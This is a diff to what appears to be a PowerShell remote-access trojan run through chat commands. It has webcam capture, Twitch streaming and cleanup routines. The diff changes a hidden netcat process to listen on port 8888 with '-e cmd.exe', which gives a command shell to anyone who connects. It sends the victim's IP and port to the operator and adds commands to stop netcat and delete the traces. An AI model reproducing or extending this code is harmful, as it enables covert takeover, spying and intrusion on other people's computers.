@@ -120,6 +120,10 @@ function cleanAll {
     # Remove webcam
     Send-Message "Deleting_webcam.."
     Remove-Item "C:\Users\$env:username\Documents\CommandCam.exe"
+    # Remove netcat
+    Send-Message "Deleting_netcat.."
+    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
+    Remove-Item "C:\Users\$env:username\Documents\nc.zip"
 }
 
 function installCurl {
@@ -525,11 +529,24 @@ function netcat {
     
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
-    $args = "-lp 8888"
+    $args = "-lp 8888 -v -e cmd.exe"
     $netcat = $outpathUnzip+"\nc.exe"
 
     Start-Sleep -Seconds 5
+    Send-Message "Listening.."
+    Send-Message "IP:$ipV4"
+    Send-Message "Port:8888"
     Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
+}
+
+function stopnetcat {
+    Send-Message "Stopping_netcat.."
+    taskkill /F /IM nc.exe
+    
+    Sleep -Seconds 5
+    Send-Message "Deleting_netcat.."
+    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
+    Remove-Item "C:\Users\$env:username\Documents\nc.zip" 
 }
 
 function twitch($STREAM_KEY) {
@@ -712,6 +729,9 @@ While ($DoNotExit)  {
       }
       "/nc $ipV4"{
         netcat
+      }
+      "/stopnc $ipV4"{
+        stopnetcat
       }
       "/starttwitch $ipV4 *"{
         $STREAM_KEY = ($LastMessageText -split ("/twitch $ipV4 "))[1]
